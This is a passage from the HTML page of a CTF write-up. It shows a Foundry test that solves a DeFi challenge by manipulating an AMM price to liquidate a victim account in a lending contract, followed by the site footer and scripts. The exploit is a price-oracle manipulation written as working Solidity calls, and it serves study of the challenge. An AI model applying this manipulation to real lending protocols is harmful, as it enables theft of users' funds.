+<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;Initial dai balance: &quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">dai</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">player</span><span class="p">));</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">startPrank</span><span class="p">(</span><span class="nx">player</span><span class="p">);</span>
+<span class="w">        </span><span class="cm">/*////////////////////////////////////////////////////</span>
+<span class="cm">        //            Add your attack logic below!          //</span>
+<span class="cm">        //                                                  //</span>
+<span class="cm">        // terminal command to run the specific test:       //</span>
+<span class="cm">        // forge test --match-contract Challenge8Test -vvvv //</span>
+<span class="cm">        ////////////////////////////////////////////////////*/</span>
+<span class="w">        </span><span class="nx">token</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">oiler</span><span class="p">),</span><span class="w"> </span><span class="mf">4</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">oiler</span><span class="p">.</span><span class="nx">deposit</span><span class="p">(</span><span class="mf">4</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">oiler</span><span class="p">.</span><span class="nx">borrow</span><span class="p">(</span><span class="mf">3</span><span class="p">);</span><span class="w">    </span><span class="c1">// for repayment</span>
+<span class="w">        </span><span class="nx">token</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">amm</span><span class="p">),</span><span class="w"> </span><span class="mf">96</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">amm</span><span class="p">.</span><span class="nx">swap</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">token</span><span class="p">),</span><span class="w"> </span><span class="mf">96</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">oiler</span><span class="p">.</span><span class="nx">liquidate</span><span class="p">(</span><span class="nx">superman</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">dai</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">amm</span><span class="p">),</span><span class="w"> </span><span class="nx">dai</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">player</span><span class="p">));</span>
+<span class="w">        </span><span class="nx">amm</span><span class="p">.</span><span class="nx">swap</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">dai</span><span class="p">),</span><span class="w"> </span><span class="nx">dai</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">player</span><span class="p">));</span>
+<span class="w">        </span><span class="c1">//==================================================//</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">stopPrank</span><span class="p">();</span>
+
+<span class="w">        </span><span class="c1">// Conditions to pass:</span>
+<span class="w">        </span><span class="c1">//      - Player has liquidated the victim</span>
+<span class="w">        </span><span class="c1">//      - Player has more than 150 $TOKENs</span>
+<span class="w">        </span><span class="c1">//      - Extra: Player has more than 200 $TOKENs</span>
+<span class="w">        </span><span class="nx">Oiler</span><span class="p">.</span><span class="nx">User</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">victim</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">oiler</span><span class="p">.</span><span class="nx">getUserData</span><span class="p">(</span><span class="nx">superman</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">assertEq</span><span class="p">(</span><span class="nx">victim</span><span class="p">.</span><span class="nx">liquidated</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">assert</span><span class="p">(</span><span class="nx">token</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">player</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">200</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="p">}</span>
+</code></pre></div>
+
+  <hr>
+<div class="md-source-file">
+  <small>
+    
+      最后更新:
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2023年7月22日 18:00:19</span>
+      
+    
+  </small>
+</div>
+
+              
+
+  
+    <div class="md-source-date">
+      <small>
+          <span class="twemoji">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M5.5 3.5a2 2 0 1 0 0 4 2 2 0 0 0 0-4zM2 5.5a3.5 3.5 0 1 1 5.898 2.549 5.507 5.507 0 0 1 3.034 4.084.75.75 0 1 1-1.482.235 4.001 4.001 0 0 0-7.9 0 .75.75 0 0 1-1.482-.236A5.507 5.507 0 0 1 3.102 8.05 3.49 3.49 0 0 1 2 5.5zM11 4a.75.75 0 1 0 0 1.5 1.5 1.5 0 0 1 .666 2.844.75.75 0 0 0-.416.672v.352a.75.75 0 0 0 .574.73c1.2.289 2.162 1.2 2.522 2.372a.75.75 0 1 0 1.434-.44 5.01 5.01 0 0 0-2.56-3.012A3 3 0 0 0 11 4z"/></svg> 
+          </span>
+          Contributors: <span class='git-page-authors git-authors'><a href='mailto:137126578@qq.com'>YanhuiJessica</a></span>
+      </small>
+      <br>
+      <small>
+          <span id="busuanzi_container_page_pv">
+            <span class="twemoji">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0 8a5 5 0 0 1-5-5 5 5 0 0 1 5-5 5 5 0 0 1 5 5 5 5 0 0 1-5 5m0-12.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5Z"/></svg>
+            </span>
+            Pageviews: <span id="busuanzi_value_page_pv"></span>
+          </span>
+      </small>
+    </div>
+  
+  
+  <!-- Giscus -->
+  <h2 id="__comments">评论</h2>
+  <script src="https://giscus.app/client.js"
+      data-repo="YanhuiJessica/Chictf-Writeups"
+      data-repo-id="MDEwOlJlcG9zaXRvcnkyNDg1MTU1OTc="
+      data-category="General"
+      data-category-id="DIC_kwDODtAMDc4CP_N3"
+      data-mapping="title"
+      data-reactions-enabled="1"
+      data-emit-metadata="0"
+      data-input-position="top"
+      data-theme="light"
+      data-lang="zh-CN"
+      data-loading="lazy"
+      crossorigin="anonymous"
+      async>
+  </script>
+
+  <!-- Synchronize Giscus theme with palette -->
+  <script>
+    var giscus = document.querySelector("script[src*=giscus]")
+
+    /* Set palette on initial load */
+    var palette = __md_get("__palette")
+    if (palette && typeof palette.color === "object") {
+      var theme = palette.color.scheme === "slate" ? "dark" : "light"
+      giscus.setAttribute("data-theme", theme)
+    }
+
+    /* Register event handlers after documented loaded */
+    document.addEventListener("DOMContentLoaded", function() {
+      var ref = document.querySelector("[data-md-component=palette]")
+      ref.addEventListener("change", function() {
+        var palette = __md_get("__palette")
+        if (palette && typeof palette.color === "object") {
+          var theme = palette.color.scheme === "slate" ? "dark" : "light"
+
+          /* Instruct Giscus to change theme */
+          var frame = document.querySelector(".giscus-frame")
+          frame.contentWindow.postMessage(
+            { giscus: { setConfig: { theme } } },
+            "https://giscus.app"
+          )
+        }
+      })
+    })
+  </script>
+
+            </article>
+            
+          </div>
+        </div>
+        
+          <a href="#" class="md-top md-icon" data-md-component="top" hidden>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
+            回到页面顶部
+          </a>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+    <nav class="md-footer__inner md-grid" aria-label="页脚" >
+      
+        
+        <a href="../quillctf/license_manager/" class="md-footer__link md-footer__link--prev" aria-label="上一页: LicenseManager" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                上一页
+              </span>
+              LicenseManager
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../solana_pathway/" class="md-footer__link md-footer__link--next" aria-label="下一页: Solana Pathway" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                下一页
+              </span>
+              Solana Pathway
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2020 - 2022 YanhuiJessica
+    </div>
+  
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+      
+      
+    
+    <a href="https://github.com/YanhuiJessica" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1zM480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2zm-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3zm-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs", "navigation.top", "navigation.tracking", "search.suggest", "search.highlight", "search.share"], "search": "../../assets/javascripts/workers/search.b028fd86.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\s\\-\uff0c\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version.title": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.f758a944.min.js"></script>
+      
+        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+      
+        <script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+      
+    
+  </body>
+</html>
